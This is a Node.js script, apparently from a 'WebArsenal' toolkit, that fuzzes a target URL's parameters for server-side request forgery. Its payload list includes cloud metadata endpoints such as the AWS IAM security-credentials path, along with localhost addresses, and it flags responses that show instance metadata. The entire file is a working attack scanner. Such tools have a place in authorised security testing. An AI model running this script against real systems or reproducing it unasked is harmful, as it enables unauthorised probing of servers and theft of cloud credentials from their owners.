#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: ssrf-hunter.js                                     ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('ssrf-hunter.js')
  .description('Tests for Server-Side Request Forgery vulnerabilities using metadata and localhost payloads.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters (e.g. https://example.com/api?url=test)')
  .option('-p, --param <name>', 'Specific parameter to fuzz')
  .parse(process.argv);

const opts = program.opts();

const SSRF_PAYLOADS = [
  "http://169.254.169.254/latest/meta-data/", // AWS/OpenStack
  "http://metadata.google.internal/computeMetadata/v1/", // Google Cloud
  "http://127.0.0.1:80", // Localhost
  "http://localhost:80", // Localhost
  "http://0.0.0.0:80", // Localhost
  "http://[::]:80", // Localhost (IPv6)
  "http://169.254.169.254/latest/user-data/", // AWS/OpenStack
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/", // AWS
  "http://instance-data/latest/meta-data/" // Azure
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'ssrf-hunter.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const params = opts.param ? [opts.param] : Array.from(targetUrl.searchParams.keys());
  
  if (params.length === 0) {
    console.log(chalk.yellow('[!] No parameters found. Use -u <url?file=test>'));
    return;
  }
  
  for (const param of params) {
    console.log(chalk.cyan(`[*] Fuzzing [SSRF] for: ${param}`));
    for (const payload of SSRF_PAYLOADS) {
      const testUrl = new URL(targetUrl.href);
      testUrl.searchParams.set(param, payload);
      
      try {
        const res = await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
        const body = String(res.data);
        
        // Detection logic: Check for cloud metadata patterns
        if (body.includes('instance-id') || body.includes('ami-id') || body.includes('computeMetadata') || body.includes('identity')) {
           console.log(chalk.bold.red(`\n[!] SSRF VULNERABILITY DETECTED! [${param}]`));
           console.log(chalk.red(`    Payload: ${payload}`));
           console.log(chalk.red(`    URL: ${testUrl.href}\n`));
           break;
        }
      } catch (e) {
        // Timeouts or errors can also indicate successful SSRF to internal hosts, but harder to confirm automatically.
      }
    }
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
